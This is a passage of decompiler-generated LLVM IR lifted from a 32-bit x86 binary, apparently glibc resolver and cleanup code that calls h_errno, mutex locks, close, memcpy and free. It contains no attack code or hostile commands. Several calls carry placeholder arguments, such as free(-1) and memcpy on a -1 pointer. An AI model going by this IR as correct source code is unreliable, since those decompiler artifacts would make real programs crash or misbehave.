  %v1_80660c8 = add i32 %v0_80660c8, 36
  %v2_80660c8 = inttoptr i32 %v1_80660c8 to i32*
  %v3_80660c8 = load i32, i32* %v2_80660c8, align 4
  store i32 %v3_80660c8, i32* %eax.global-to-local, align 4
  %v1_80660cb = load i32, i32* @esp, align 4
  %v2_80660cb = add i32 %v1_80660cb, 152
  %v3_80660cb = inttoptr i32 %v2_80660cb to i32*
  store i32 %v3_80660c8, i32* %v3_80660cb, align 4
  %v0_80660d2 = load i32, i32* @ecx, align 4
  %v1_80660d2 = load i32, i32* @esp, align 4
  %v2_80660d2 = add i32 %v1_80660d2, -4
  %v3_80660d2 = inttoptr i32 %v2_80660d2 to i32*
  store i32 %v0_80660d2, i32* %v3_80660d2, align 4
  %v1_80660d3 = add i32 %v1_80660d2, -8
  %v2_80660d3 = inttoptr i32 %v1_80660d3 to i32*
  store i32 40, i32* %v2_80660d3, align 4
  %v1_80660d5 = add i32 %v1_80660d2, 116
  store i32 %v1_80660d5, i32* %edx.global-to-local, align 4
  %v2_80660d9 = add i32 %v1_80660d2, -12
  %v3_80660d9 = inttoptr i32 %v2_80660d9 to i32*
  store i32 %v1_80660d5, i32* %v3_80660d9, align 4
  %v0_80660da = load i32, i32* @edi, align 4
  %v2_80660da = add i32 %v1_80660d2, -16
  %v3_80660da = inttoptr i32 %v2_80660da to i32*
  store i32 %v0_80660da, i32* %v3_80660da, align 4
  %v4_80660db = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80660db, i32* %eax.global-to-local, align 4
  %v0_80660e0 = load i32, i32* @edi, align 4
  %v1_80660e0 = add i32 %v0_80660e0, 4
  %v2_80660e0 = inttoptr i32 %v1_80660e0 to i32*
  %v3_80660e0 = load i32, i32* %v2_80660e0, align 4
  store i32 %v3_80660e0, i32* %eax.global-to-local, align 4
  %v0_80660e3 = load i32, i32* @esp, align 4
  %v1_80660e3 = add i32 %v0_80660e3, 16
  %v9_80660e6 = icmp eq i32 %v3_80660e0, 24
  br i1 %v9_80660e6, label %dec_label_pc_80660b4.dec_label_pc_806610d_crit_edge, label %dec_label_pc_80660eb

dec_label_pc_80660b4.dec_label_pc_806610d_crit_edge: ; preds = %dec_label_pc_80660b4
  %.pre24 = add i32 %v0_80660e3, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_806610d.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_806610d

dec_label_pc_80660eb:                             ; preds = %dec_label_pc_80660b4
  %v1_80660eb = add i32 %v0_80660e0, 28
  %v2_80660eb = inttoptr i32 %v1_80660eb to i32*
  %v3_80660eb = load i32, i32* %v2_80660eb, align 4
  %v4_80660eb = icmp eq i32 %v3_80660eb, 0
  br i1 %v4_80660eb, label %dec_label_pc_80661aa, label %dec_label_pc_80660f5

dec_label_pc_80660f5:                             ; preds = %dec_label_pc_80660eb
  %v1_80660f5 = add i32 %v0_80660e3, 260
  %v2_80660f5 = inttoptr i32 %v1_80660f5 to i32*
  %v3_80660f5 = load i32, i32* %v2_80660f5, align 4
  %v12_80660f5 = icmp eq i32 %v3_80660f5, 1
  br i1 %v12_80660f5, label %dec_label_pc_806610d, label %dec_label_pc_80660ff

dec_label_pc_80660ff:                             ; preds = %dec_label_pc_80660f5
  %v12_80660ff = icmp eq i32 %v3_80660f5, 28
  %v1_8066107 = icmp eq i1 %v12_80660ff, false
  br i1 %v1_8066107, label %dec_label_pc_80661aa, label %dec_label_pc_806610d

dec_label_pc_806610d:                             ; preds = %dec_label_pc_80660b4.dec_label_pc_806610d_crit_edge, %dec_label_pc_80660ff, %dec_label_pc_80660f5
  %v4_806610d = phi i32 [ %v4_806610d.pre, %dec_label_pc_80660b4.dec_label_pc_806610d_crit_edge ], [ %v3_80660f5, %dec_label_pc_80660ff ], [ %v3_80660f5, %dec_label_pc_80660f5 ]
  %v15_806610d = icmp eq i32 %v3_80660e0, %v4_806610d
  br i1 %v15_806610d, label %dec_label_pc_8066122, label %dec_label_pc_8066116

dec_label_pc_8066116:                             ; preds = %dec_label_pc_806610d
  %v1_8066119 = inttoptr i32 %v0_80660e0 to i32*
  %v2_8066119 = load i32, i32* %v1_8066119, align 4
  %v5_8066119 = inttoptr i32 %v0_80660e3 to i32*
  store i32 %v2_8066119, i32* %v5_8066119, align 4
  %v1_806611b = call i32 @free(i32 -1)
  store i32 %v1_806611b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066192

dec_label_pc_8066122:                             ; preds = %dec_label_pc_806610d
  %v0_8066122 = load i32, i32* @ebx, align 4
  %v1_8066124 = sub i32 -1, %v0_8066122
  store i32 %v1_8066124, i32* %eax.global-to-local, align 4
  %v2_8066126 = add i32 %v0_80660e3, 120
  %v3_8066126 = inttoptr i32 %v2_8066126 to i32*
  %v4_8066126 = load i32, i32* %v3_8066126, align 4
  %v5_8066126 = add i32 %v4_8066126, %v1_8066124
  store i32 %v5_8066126, i32* %eax.global-to-local, align 4
  %v2_806612a = add i32 %v0_80660e0, 36
  %v3_806612a = inttoptr i32 %v2_806612a to i32*
  store i32 %v5_8066126, i32* %v3_806612a, align 4
  %v0_806612d = load i32, i32* @edi, align 4
  %v1_806612d = add i32 %v0_806612d, 16
  %v2_806612d = inttoptr i32 %v1_806612d to i32*
  %v3_806612d = load i32, i32* %v2_806612d, align 4
  %v1_8066130 = add i32 %v3_806612d, 4
  store i32 %v1_8066130, i32* %eax.global-to-local, align 4
  %v2_8066133 = add i32 %v0_806612d, 36
  %v3_8066133 = inttoptr i32 %v2_8066133 to i32*
  %v4_8066133 = load i32, i32* %v3_8066133, align 4
  %v7_8066133 = mul i32 %v4_8066133, %v1_8066130
  store i32 %v7_8066133, i32* %eax.global-to-local, align 4
  %v2_8066137 = add i32 %v0_806612d, 32
  %v3_8066137 = inttoptr i32 %v2_8066137 to i32*
  %v4_8066137 = load i32, i32* %v3_8066137, align 4
  %v6_806613a = icmp ugt i32 %v7_8066133, %v4_8066137
  br i1 %v6_806613a, label %dec_label_pc_8066122.dec_label_pc_80661aa.loopexit_crit_edge, label %dec_label_pc_806613c

dec_label_pc_8066122.dec_label_pc_80661aa.loopexit_crit_edge: ; preds = %dec_label_pc_8066122
  %v0_80661aa.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80661aa

dec_label_pc_806613c:                             ; preds = %dec_label_pc_8066122
  store i32 0, i32* %v3_8066133, align 4
  %v0_8066143 = load i32, i32* @esp, align 4
  %v1_8066143 = add i32 %v0_8066143, 27
  %v2_8066143 = inttoptr i32 %v1_8066143 to i8*
  store i8 0, i8* %v2_8066143, align 1
  %v1_8066195.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8066195

dec_label_pc_806614a:                             ; preds = %dec_label_pc_80660a9
  %v1_806614d = add i32 %v0_806608a, 132
  %v2_806614d = inttoptr i32 %v1_806614d to i32*
  %v3_806614d = load i32, i32* %v2_806614d, align 4
  %v6_806614d = inttoptr i32 %v0_806608a to i32*
  store i32 %v3_806614d, i32* %v6_806614d, align 4
  %v1_8066154 = call i32 @free(i32 -1)
  store i32 %v1_8066154, i32* %eax.global-to-local, align 4
  %v0_8066159 = load i32, i32* @esp, align 4
  %v1_8066159 = add i32 %v0_8066159, 16
  %v1_806615c = add i32 %v0_8066159, 260
  %v2_806615c = inttoptr i32 %v1_806615c to i32*
  %v3_806615c = load i32, i32* %v2_806615c, align 4
  store i32 %v3_806615c, i32* %eax.global-to-local, align 4
  %v1_8066163 = add i32 %v0_8066159, 136
  %v2_8066163 = inttoptr i32 %v1_8066163 to i32*
  %v3_8066163 = load i32, i32* %v2_8066163, align 4
  %v15_8066163 = icmp eq i32 %v3_8066163, %v3_806615c
  %v1_8066167 = icmp eq i1 %v15_8066163, false
  br i1 %v1_8066167, label %dec_label_pc_8066195, label %dec_label_pc_8066169

dec_label_pc_8066169:                             ; preds = %dec_label_pc_806614a
  %v0_8066169 = load i32, i32* @edi, align 4
  %v1_8066169 = add i32 %v0_8066169, 16
  %v2_8066169 = inttoptr i32 %v1_8066169 to i32*
  %v3_8066169 = load i32, i32* %v2_8066169, align 4
  store i32 %v3_8066169, i32* %eax.global-to-local, align 4
  %v2_806616c = add i32 %v0_8066159, 148
  %v3_806616c = inttoptr i32 %v2_806616c to i32*
  %v4_806616c = load i32, i32* %v3_806616c, align 4
  %v15_806616c = icmp eq i32 %v3_8066169, %v4_806616c
  %v1_8066173 = icmp eq i1 %v15_806616c, false
  br i1 %v1_8066173, label %dec_label_pc_806622f, label %dec_label_pc_8066179

dec_label_pc_8066179:                             ; preds = %dec_label_pc_8066169
  %v0_8066179 = load i32, i32* @edx, align 4
  %v2_8066179 = add i32 %v0_8066159, 12
  %v3_8066179 = inttoptr i32 %v2_8066179 to i32*
  store i32 %v0_8066179, i32* %v3_8066179, align 4
  %v0_806617a = load i32, i32* %eax.global-to-local, align 4
  %v2_806617a = add i32 %v0_8066159, 8
  %v3_806617a = inttoptr i32 %v2_806617a to i32*
  store i32 %v0_806617a, i32* %v3_806617a, align 4
  %v1_806617b = add i32 %v0_8066159, 152
  %v2_806617b = inttoptr i32 %v1_806617b to i32*
  %v3_806617b = load i32, i32* %v2_806617b, align 4
  %v5_806617b = add i32 %v0_8066159, 4
  %v6_806617b = inttoptr i32 %v5_806617b to i32*
  store i32 %v3_806617b, i32* %v6_806617b, align 4
  %v0_8066182 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066182 = load i32, i32* @edi, align 4
  %v2_8066182 = add i32 %v1_8066182, 36
  %v3_8066182 = inttoptr i32 %v2_8066182 to i32*
  %v4_8066182 = load i32, i32* %v3_8066182, align 4
  %v7_8066182 = mul i32 %v4_8066182, %v0_8066182
  store i32 %v7_8066182, i32* %eax.global-to-local, align 4
  %v2_8066186 = add i32 %v1_8066182, 28
  %v3_8066186 = inttoptr i32 %v2_8066186 to i32*
  %v4_8066186 = load i32, i32* %v3_8066186, align 4
  %v5_8066186 = add i32 %v4_8066186, %v7_8066182
  store i32 %v5_8066186, i32* %eax.global-to-local, align 4
  %v3_8066189 = inttoptr i32 %v0_8066159 to i32*
  store i32 %v5_8066186, i32* %v3_8066189, align 4
  %v4_806618a = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_806618a, i32* %eax.global-to-local, align 4
  %v0_806618f = load i32, i32* @edi, align 4
  %v1_806618f = add i32 %v0_806618f, 36
  %v2_806618f = inttoptr i32 %v1_806618f to i32*
  %v3_806618f = load i32, i32* %v2_806618f, align 4
  %v4_806618f = add i32 %v3_806618f, 1
  store i32 %v4_806618f, i32* %v2_806618f, align 4
  br label %dec_label_pc_8066192

dec_label_pc_8066192:                             ; preds = %dec_label_pc_8066116, %dec_label_pc_8066179
  %v0_8066192 = load i32, i32* @esp, align 4
  %v1_8066192 = add i32 %v0_8066192, 16
  br label %dec_label_pc_8066195

dec_label_pc_8066195:                             ; preds = %dec_label_pc_806614a, %dec_label_pc_806613c, %dec_label_pc_8066192
  %v1_8066195 = phi i32 [ %v1_8066159, %dec_label_pc_806614a ], [ %v1_8066195.pre, %dec_label_pc_806613c ], [ %v1_8066192, %dec_label_pc_8066192 ]
  %v0_8066195 = load i32, i32* @esi, align 4
  %v2_8066195 = add i32 %v1_8066195, 52
  %v3_8066195 = inttoptr i32 %v2_8066195 to i32*
  %v4_8066195 = load i32, i32* %v3_8066195, align 4
  %v5_8066195 = add i32 %v4_8066195, %v0_8066195
  store i32 %v5_8066195, i32* @esi, align 4
  %v0_8066199 = load i32, i32* @ebx, align 4
  %v1_8066199 = add i32 %v0_8066199, 1
  store i32 %v1_8066199, i32* @ebx, align 4
  %v2_806619a = add i32 %v1_8066195, 104
  %v3_806619a = inttoptr i32 %v2_806619a to i32*
  %v4_806619a = load i32, i32* %v3_806619a, align 4
  %v5_806619a = sub i32 %v1_8066199, %v4_806619a
  %v11_806619a = xor i32 %v4_806619a, %v1_8066199
  %v12_806619a = xor i32 %v5_806619a, %v1_8066199
  %v13_806619a = and i32 %v12_806619a, %v11_806619a
  %v14_806619a = icmp slt i32 %v13_806619a, 0
  %v16_806619a = icmp slt i32 %v5_806619a, 0
  %v2_806619e = icmp eq i1 %v16_806619a, %v14_806619a
  br i1 %v2_806619e, label %dec_label_pc_80661aa, label %dec_label_pc_80661a0

dec_label_pc_80661a0:                             ; preds = %dec_label_pc_80661a0.lr.ph, %dec_label_pc_8066195
  %v0_80661a0 = phi i32 [ %v0_80661a0.pre, %dec_label_pc_80661a0.lr.ph ], [ %v5_8066195, %dec_label_pc_8066195 ]
  %v0_806607679 = phi i32 [ %v1_806619a.pre, %dec_label_pc_80661a0.lr.ph ], [ %v1_8066195, %dec_label_pc_8066195 ]
  %v2_80661a0 = add i32 %v0_806607679, 16
  %v3_80661a0 = inttoptr i32 %v2_80661a0 to i32*
  %v4_80661a0 = load i32, i32* %v3_80661a0, align 4
  %v5_80661a0 = sub i32 %v0_80661a0, %v4_80661a0
  %v11_80661a0 = xor i32 %v4_80661a0, %v0_80661a0
  %v12_80661a0 = xor i32 %v5_80661a0, %v0_80661a0
  %v13_80661a0 = and i32 %v12_80661a0, %v11_80661a0
  %v14_80661a0 = icmp slt i32 %v13_80661a0, 0
  %v16_80661a0 = icmp slt i32 %v5_80661a0, 0
  %v2_80661a4 = icmp eq i1 %v16_80661a0, %v14_80661a0
  br i1 %v2_80661a4, label %dec_label_pc_80661aa, label %dec_label_pc_8066076

dec_label_pc_80661aa:                             ; preds = %dec_label_pc_8066099, %dec_label_pc_806606a, %dec_label_pc_8066195, %dec_label_pc_80660eb, %dec_label_pc_80660ff, %dec_label_pc_80661a0, %dec_label_pc_8066122.dec_label_pc_80661aa.loopexit_crit_edge
  %v0_80661aa = phi i32 [ %v0_80661aa.pre.pre, %dec_label_pc_8066122.dec_label_pc_80661aa.loopexit_crit_edge ], [ %v1_806619a.pre, %dec_label_pc_806606a ], [ %v1_8066195, %dec_label_pc_8066195 ], [ %v1_80660e3, %dec_label_pc_80660eb ], [ %v1_80660e3, %dec_label_pc_80660ff ], [ %v0_806607679, %dec_label_pc_80661a0 ], [ %v1_806608a, %dec_label_pc_8066099 ]
  %v1_80661ad = add i32 %v0_80661aa, 20
  %v2_80661ad = inttoptr i32 %v1_80661ad to i32*
  %v3_80661ad = load i32, i32* %v2_80661ad, align 4
  %v5_80661ad = add i32 %v0_80661aa, -16
  %v6_80661ad = inttoptr i32 %v5_80661ad to i32*
  store i32 %v3_80661ad, i32* %v6_80661ad, align 4
  %v1_80661b1 = call i32 @__libc_close(i32 -1)
  store i32 %v1_80661b1, i32* %eax.global-to-local, align 4
  %v0_80661b6 = load i32, i32* @esp, align 4
  %v1_80661b9 = add i32 %v0_80661b6, 272
  %v2_80661b9 = inttoptr i32 %v1_80661b9 to i32*
  %v3_80661b9 = load i32, i32* %v2_80661b9, align 4
  %v4_80661b9 = icmp eq i32 %v3_80661b9, 0
  br i1 %v4_80661b9, label %dec_label_pc_80661ce, label %dec_label_pc_80661c3

dec_label_pc_80661c3:                             ; preds = %dec_label_pc_80661aa
  store i32 %v3_80661b9, i32* %edx.global-to-local, align 4
  %v2_80661ca = inttoptr i32 %v3_80661b9 to i32*
  store i32 %v2_8065c3a, i32* %v2_80661ca, align 4
  %v0_80661da.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80661da

dec_label_pc_80661ce:                             ; preds = %dec_label_pc_80661aa
  %v3_80661d1 = inttoptr i32 %v0_80661b6 to i32*
  store i32 %v2_8065c3a, i32* %v3_80661d1, align 4
  %v1_80661d2 = call i32 @free(i32 -1)
  store i32 %v1_80661d2, i32* %eax.global-to-local, align 4
  %v0_80661d7 = load i32, i32* @esp, align 4
  %v1_80661d7 = add i32 %v0_80661d7, 16
  br label %dec_label_pc_80661da

dec_label_pc_80661da:                             ; preds = %dec_label_pc_80661c3, %dec_label_pc_80661ce
  %v0_80661da = phi i32 [ %v0_80661da.pre, %dec_label_pc_80661c3 ], [ %v1_80661d7, %dec_label_pc_80661ce ]
  %v1_80661dd = add i32 %v0_80661da, 12
  %v2_80661dd = inttoptr i32 %v1_80661dd to i32*
  %v3_80661dd = load i32, i32* %v2_80661dd, align 4
  %v5_80661dd = add i32 %v0_80661da, -16
  %v6_80661dd = inttoptr i32 %v5_80661dd to i32*
  store i32 %v3_80661dd, i32* %v6_80661dd, align 4
  %v1_80661e1 = call i32 @free(i32 -1)
  store i32 %v1_80661e1, i32* %eax.global-to-local, align 4
  %v0_80661e6 = load i32, i32* @esp, align 4
  %v1_80661e9 = add i32 %v0_80661e6, 8
  %v2_80661e9 = inttoptr i32 %v1_80661e9 to i32*
  store i32 ptrtoint (i8** @global_var_807da1c.842 to i32), i32* %v2_80661e9, align 4
  %v1_80661ee = add i32 %v0_80661e6, 4
  %v2_80661ee = inttoptr i32 %v1_80661ee to i32*
  store i32 134586897, i32* %v2_80661ee, align 4
  %v1_80661f3 = add i32 %v0_80661e6, 200
  store i32 %v1_80661f3, i32* @ebx, align 4
  %v3_80661fa = inttoptr i32 %v0_80661e6 to i32*
  store i32 %v1_80661f3, i32* %v3_80661fa, align 4
  %v4_80661fb = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80661fb, i32* %eax.global-to-local, align 4
  %v0_8066200 = load i32, i32* @esp, align 4
  %v1_8066200 = inttoptr i32 %v0_8066200 to i32*
  store i32 ptrtoint (i8** @global_var_807da1c.842 to i32), i32* %v1_8066200, align 4
  %v1_8066207 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8066207, i32* %eax.global-to-local, align 4
  %v0_806620c = load i32, i32* @esp, align 4
  %v1_806620c = add i32 %v0_806620c, 56
  %v2_806620c = inttoptr i32 %v1_806620c to i32*
  %v3_806620c = load i32, i32* %v2_806620c, align 4
  store i32 %v3_806620c, i32* %eax.global-to-local, align 4
  %v1_8066210 = add i32 %v0_806620c, 60
  %v2_8066210 = inttoptr i32 %v1_8066210 to i32*
  %v3_8066210 = load i32, i32* %v2_8066210, align 4
  store i32 %v3_8066210, i32* %edx.global-to-local, align 4
  %v1_8066214 = inttoptr i32 %v0_806620c to i32*
  %v3_8066214 = add i32 %v0_806620c, 4
  %v1_8066215 = inttoptr i32 %v3_8066214 to i32*
  %v2_8066215 = load i32, i32* %v1_8066215, align 4
  store i32 %v2_8066215, i32* @edi, align 4
  %v1_8066216 = sext i32 %v3_806620c to i64
  store i64 %v1_8066216, i64* @global_var_807da34.843, align 8
  %v1_806621b = trunc i32 %v3_8066210 to i16
  store i16 %v1_806621b, i16* @global_var_8075008.844, align 8
  store i32 1, i32* %v1_8066215, align 4
  %v0_8066224 = load i32, i32* @ebx, align 4
  store i32 %v0_8066224, i32* %v1_8066214, align 4
  %v3_8066225 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065cc8)
  store i32 %v3_8066225, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066366

dec_label_pc_806622f:                             ; preds = %dec_label_pc_8066169
  %v1_8066232 = inttoptr i32 %v0_8066169 to i32*
  %v2_8066232 = load i32, i32* %v1_8066232, align 4
  %v5_8066232 = inttoptr i32 %v0_8066159 to i32*
  store i32 %v2_8066232, i32* %v5_8066232, align 4
  %v1_8066234 = call i32 @free(i32 -1)
  store i32 %v1_8066234, i32* %eax.global-to-local, align 4
  %v0_8066239 = load i32, i32* @esp, align 4
  %v1_8066239 = add i32 %v0_8066239, 16
  br label %dec_label_pc_806623c

dec_label_pc_806623c:                             ; preds = %dec_label_pc_8065f6e, %dec_label_pc_8066099, %dec_label_pc_8066091, %dec_label_pc_806602d, %dec_label_pc_8065fb3, %dec_label_pc_8065f8f, %dec_label_pc_806622f
  %v1_8066243 = phi i32 [ %v1_8065f83, %dec_label_pc_8065f6e ], [ %v1_806608a, %dec_label_pc_8066099 ], [ %v1_806608a, %dec_label_pc_8066091 ], [ %v1_8065fa4, %dec_label_pc_806602d ], [ %v1_8065fa4, %dec_label_pc_8065fb3 ], [ %v1_8065fa4, %dec_label_pc_8065f8f ], [ %v1_8066239, %dec_label_pc_806622f ]
  %v1_806623c = add i32 %v1_8066243, 51
  %v2_806623c = inttoptr i32 %v1_806623c to i8*
  %v3_806623c = load i8, i8* %v2_806623c, align 1
  %v4_806623c = icmp eq i8 %v3_806623c, 0
  %v1_8066241 = icmp eq i1 %v4_806623c, false
  br i1 %v1_8066241, label %dec_label_pc_8066287, label %dec_label_pc_8066243

dec_label_pc_8066243:                             ; preds = %dec_label_pc_806623c
  %v0_8066243 = load i32, i32* @ecx, align 4
  %v2_8066243 = add i32 %v1_8066243, -4
  %v3_8066243 = inttoptr i32 %v2_8066243 to i32*
  store i32 %v0_8066243, i32* %v3_8066243, align 4
  %v1_8066244 = add i32 %v1_8066243, -8
  %v2_8066244 = inttoptr i32 %v1_8066244 to i32*
  store i32 ptrtoint (i32* @global_var_807500c.723 to i32), i32* %v2_8066244, align 4
  %v1_8066249 = add i32 %v1_8066243, -12
  %v2_8066249 = inttoptr i32 %v1_8066249 to i32*
  store i32 134586897, i32* %v2_8066249, align 4
  %v1_806624e = add i32 %v1_8066243, 184
  store i32 %v1_806624e, i32* @esi, align 4
  %v2_8066255 = add i32 %v1_8066243, -16
  %v3_8066255 = inttoptr i32 %v2_8066255 to i32*
  store i32 %v1_806624e, i32* %v3_8066255, align 4
  %v4_8066256 = call i32 @__pthread_cleanup_push_defer(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065cc8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8066256, i32* %eax.global-to-local, align 4
  %v0_806625b = load i32, i32* @esp, align 4
  %v1_806625b = inttoptr i32 %v0_806625b to i32*
  store i32 ptrtoint (i32* @global_var_807500c.723 to i32), i32* %v1_806625b, align 4
  %v1_8066262 = call i32 @pthread_mutex_lock(i32 -1)
  store i32 %v1_8066262, i32* %eax.global-to-local, align 4
  %v0_8066267 = load i32, i32* @global_var_807f564.845, align 4
  %v0_806626d = load i32, i32* @esp, align 4
  %v1_806626d = inttoptr i32 %v0_806626d to i32*
  %v2_806626d = load i32, i32* %v1_806626d, align 4
  store i32 %v2_806626d, i32* %eax.global-to-local, align 4
  %v3_806626d = add i32 %v0_806626d, 4
  %v1_806626e = inttoptr i32 %v3_806626d to i32*
  %v2_806626e = load i32, i32* %v1_806626e, align 4
  store i32 %v2_806626e, i32* %edx.global-to-local, align 4
  %v1_806626f = add i32 %v0_8066267, -1
  store i32 %v1_806626f, i32* @ebx, align 4
  store i32 1, i32* %v1_806626e, align 4
  %v0_8066272 = load i32, i32* @esi, align 4
  store i32 %v0_8066272, i32* %v1_806626d, align 4
  %v3_8066273 = call i32 @__pthread_cleanup_pop_restore(i32* inttoptr (i32 -1 to i32*), i32 %v15_8065cc8)
  store i32 %v3_8066273, i32* %eax.global-to-local, align 4
  %v0_8066278 = load i32, i32* @esp, align 4
  %v1_8066278 = add i32 %v0_8066278, 16
  %v1_806627b = add i32 %v0_8066278, 52
  %v2_806627b = inttoptr i32 %v1_806627b to i32*
  %v3_806627b = load i32, i32* %v2_806627b, align 4
  %v4_806627b = load i32, i32* @ebx, align 4
  %v5_806627b = sub i32 %v3_806627b, %v4_806627b
  %v11_806627b = xor i32 %v4_806627b, %v3_806627b
  %v12_806627b = xor i32 %v5_806627b, %v3_806627b
  %v13_806627b = and i32 %v12_806627b, %v11_806627b
  %v14_806627b = icmp slt i32 %v13_806627b, 0
  %v16_806627b = icmp slt i32 %v5_806627b, 0
  %v2_806627f = icmp eq i1 %v16_806627b, %v14_806627b
  br i1 %v2_806627f, label %dec_label_pc_8066287, label %dec_label_pc_8066281

dec_label_pc_8066281:                             ; preds = %dec_label_pc_8066243
  %v4_8066281 = add i32 %v3_806627b, 1
  store i32 %v4_8066281, i32* %v2_806627b, align 4
  br label %dec_label_pc_80662a8.backedge

dec_label_pc_8066287:                             ; preds = %dec_label_pc_8065f10, %dec_label_pc_8066243, %dec_label_pc_806623c, %dec_label_pc_8065f27
  %v1_8066296 = phi i32 [ %v1_8066278, %dec_label_pc_8066243 ], [ %v1_8066243, %dec_label_pc_806623c ], [ %v1_8065f63, %dec_label_pc_8065f27 ], [ %v0_8066287.pre, %dec_label_pc_8065f10 ]
  %v1_8066287 = add i32 %v1_8066296, 40
  %v2_8066287 = inttoptr i32 %v1_8066287 to i32*
  %v3_8066287 = load i32, i32* %v2_8066287, align 4
  %v1_806628b = add i32 %v3_8066287, 1
  store i32 %v1_806628b, i32* %eax.global-to-local, align 4
  %v1_806628c = ashr i32 %v1_806628b, 31
  store i32 %v1_806628c, i32* %edx.global-to-local, align 4
  %v1_806628d = add i32 %v1_8066296, 248
  %v2_806628d = inttoptr i32 %v1_806628d to i32*
  %v3_806628d = load i32, i32* %v2_806628d, align 4
  %v5_806628d = zext i32 %v1_806628b to i64
  %v7_806628d = zext i32 %v1_806628c to i64
  %v8_806628d = mul nuw i64 %v7_806628d, 4294967296
  %v9_806628d = or i64 %v8_806628d, %v5_806628d
  %v10_806628d = zext i32 %v3_806628d to i64
  %v11_806628d = sdiv i64 %v9_806628d, %v10_806628d
  %v12_806628d = trunc i64 %v11_806628d to i32
  store i32 %v12_806628d, i32* %eax.global-to-local, align 4
  %v13_806628d = srem i64 %v9_806628d, %v10_806628d
  %v14_806628d = trunc i64 %v13_806628d to i32
  store i32 %v14_806628d, i32* %edx.global-to-local, align 4
  %v1_8066294 = icmp eq i32 %v14_806628d, 0
  store i32 %v14_806628d, i32* %v2_8066287, align 4
  %v1_806629a = icmp eq i1 %v1_8066294, false
  br i1 %v1_806629a, label %dec_label_pc_80662a0, label %dec_label_pc_806629c

dec_label_pc_806629c:                             ; preds = %dec_label_pc_8066287
  %v0_806629c = load i32, i32* @esp, align 4
  %v1_806629c = add i32 %v0_806629c, 28
  %v2_806629c = inttoptr i32 %v1_806629c to i32*
  %v3_806629c = load i32, i32* %v2_806629c, align 4
  %v4_806629c = add i32 %v3_806629c, 1
  store i32 %v4_806629c, i32* %v2_806629c, align 4
  br label %dec_label_pc_80662a0

dec_label_pc_80662a0:                             ; preds = %dec_label_pc_8066287, %dec_label_pc_806629c
  %v0_80662a0 = load i32, i32* @esp, align 4
  %v1_80662a0 = add i32 %v0_80662a0, 36
  %v2_80662a0 = inttoptr i32 %v1_80662a0 to i32*
  store i32 -1, i32* %v2_80662a0, align 4
  br label %dec_label_pc_80662a8.backedge

dec_label_pc_80662a8.backedge:                    ; preds = %dec_label_pc_80662a0, %dec_label_pc_8065f1e, %dec_label_pc_806600c, %dec_label_pc_8066281
  %v0_80662a8.pre = load i32, i32* @esp, align 4
  %v1_80662a8 = add i32 %v0_80662a8.pre, 28
  %v2_80662a8 = inttoptr i32 %v1_80662a8 to i32*
  %v3_80662a8 = load i32, i32* %v2_80662a8, align 4
  %tmp120 = icmp ult i32 %v3_80662a8, 3
  br i1 %tmp120, label %dec_label_pc_8065d08, label %dec_label_pc_80662cd

dec_label_pc_80662cd:                             ; preds = %dec_label_pc_8065c82, %dec_label_pc_8065d1e, %dec_label_pc_8065e12, %dec_label_pc_80662a8.backedge, %entry, %dec_label_pc_8065c5c, %dec_label_pc_8065c64, %dec_label_pc_8065c72
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8065c72 ], [ -1, %dec_label_pc_8065c64 ], [ -1, %dec_label_pc_8065c5c ], [ -1, %entry ], [ %v0_8065ccf, %dec_label_pc_80662a8.backedge ], [ %v0_8065ccf, %dec_label_pc_8065e12 ], [ %v0_8065ccf, %dec_label_pc_8065d1e ], [ %v0_8065ccf, %dec_label_pc_8065c82 ]
  %v0_80662cd = call i32 @__GI___h_errno_location()
  store i32 %v0_80662cd, i32* %eax.global-to-local, align 4
  %v1_80662d2 = inttoptr i32 %v0_80662cd to i32*
  store i32 -1, i32* %v1_80662d2, align 4
  %v0_80662d8 = load i32, i32* @esp, align 4
  %v1_80662d8 = add i32 %v0_80662d8, 56
  %v2_80662d8 = inttoptr i32 %v1_80662d8 to i32*
  %v3_80662d8 = load i32, i32* %v2_80662d8, align 4
  store i32 %v3_80662d8, i32* %eax.global-to-local, align 4
  %v2_80662dc = add i32 %v0_80662d8, 44
  %v3_80662dc = inttoptr i32 %v2_80662dc to i32*
  store i32 %v3_80662d8, i32* %v3_80662dc, align 4
  br label %dec_label_pc_80662e0

dec_label_pc_80662e0:                             ; preds = %dec_label_pc_8066045, %dec_label_pc_806601d, %dec_label_pc_80662cd
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_80662cd ], [ %v0_8065ccf, %dec_label_pc_8066045 ], [ %v0_8065ccf, %dec_label_pc_806601d ]
  %v0_80662e0 = load i32, i32* @esp, align 4
  %v1_80662e0 = add i32 %v0_80662e0, 20
  %v2_80662e0 = inttoptr i32 %v1_80662e0 to i32*
  %v3_80662e0 = load i32, i32* %v2_80662e0, align 4
  %v13_80662e0 = icmp eq i32 %v3_80662e0, -1
  br i1 %v13_80662e0, label %dec_label_pc_80662e0.dec_label_pc_80662f6_crit_edge, label %dec_label_pc_80662e7

dec_label_pc_80662e0.dec_label_pc_80662f6_crit_edge: ; preds = %dec_label_pc_80662e0
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_80662f6

dec_label_pc_80662e7:                             ; preds = %dec_label_pc_80662e0
  %v3_80662ea = load i32, i32* %v2_80662e0, align 4
  %v5_80662ea = add i32 %v0_80662e0, -16
  %v6_80662ea = inttoptr i32 %v5_80662ea to i32*
